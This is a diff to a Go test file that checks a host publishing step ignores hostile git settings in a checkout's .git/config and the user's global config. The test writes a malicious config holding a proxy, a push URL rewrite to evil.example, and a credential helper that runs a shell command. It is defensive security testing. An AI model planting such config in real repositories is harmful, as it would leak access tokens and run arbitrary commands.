@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/base64"
 	"encoding/json"
+	"net"
 	"net/http"
 	"net/http/cgi"
 	"net/http/httptest"
@@ -226,18 +227,61 @@ func TestHostPublishRevokedCredentialIsRecoverable(t *testing.T) {
 	}
 }
 
-func TestHostPublishRefusesRewrittenRemote(t *testing.T) {
+// The CLI can write the checkout's .git/config and the runner user's global
+// config. None of it may influence the credential-bearing push: a proxy, a
+// CA file, a URL rewrite or a credential helper would disclose the token.
+func TestHostPublishIgnoresHostileLocalAndGlobalGitConfig(t *testing.T) {
 	s := hostPublishTestServer(t)
 	workspace, plan := preparePublish(t, s, hostPublishTestToken, "preloop/issue-PROJ-7-1a2b3c4d")
 	dir := filepath.Join(workspace, "workspace")
-	s.run(dir, "config", "--local", "url.https://evil.example/.pushInsteadOf", s.url)
+	proxy, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	var proxied atomic.Int32
+	go func() {
+		for {
+			conn, err := proxy.Accept()
+			if err != nil {
+				return
+			}
+			proxied.Add(1)
+			_ = conn.Close()
+		}
+	}()
+	t.Cleanup(func() { _ = proxy.Close() })
+	marker := filepath.Join(t.TempDir(), "helper-ran")
+	hostile := "[http]\n\tproxy = http://" + proxy.Addr().String() + "\n\tsslCAInfo = /nonexistent\n" +
+		"[url \"https://evil.example/\"]\n\tpushInsteadOf = " + s.url + "\n\tinsteadOf = " + s.url + "\n" +
+		"[credential]\n\thelper = \"!touch " + marker + "; true\"\n"
+	home := t.TempDir()
+	if err := os.WriteFile(filepath.Join(home, ".gitconfig"), []byte(hostile), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	t.Setenv("HOME", home)
+	config, err := os.OpenFile(filepath.Join(dir, ".git", "config"), os.O_APPEND|os.O_WRONLY, 0o600)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := config.WriteString(hostile); err != nil {
+		t.Fatal(err)
+	}
+	_ = config.Close()
 	if err := os.WriteFile(filepath.Join(dir, "x.txt"), []byte("x\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
-	_, err := publishHostExecWork(context.Background(), workspace, plan, func(string) {})
-	receipt, _ := hostPublicationFailureReceipt(err, plan)
-	if receipt["reason"] != hostPublishReasonUnsafeRepo {
-		t.Fatalf("receipt = %#v (%v)", receipt, err)
+	receipt, err := publishHostExecWork(context.Background(), workspace, plan, func(string) {})
+	if err != nil {
+		t.Fatalf("publish: %v", err)
+	}
+	if got := s.remoteHead(t, plan.Branch); got == "" || got != receipt["head_sha"] {
+		t.Fatalf("remote head = %q receipt = %#v", got, receipt)
+	}
+	if proxied.Load() != 0 {
+		t.Fatal("push went through the configured proxy")
+	}
+	if _, err := os.Stat(marker); err == nil {
+		t.Fatal("credential helper ran")
 	}
 }
 
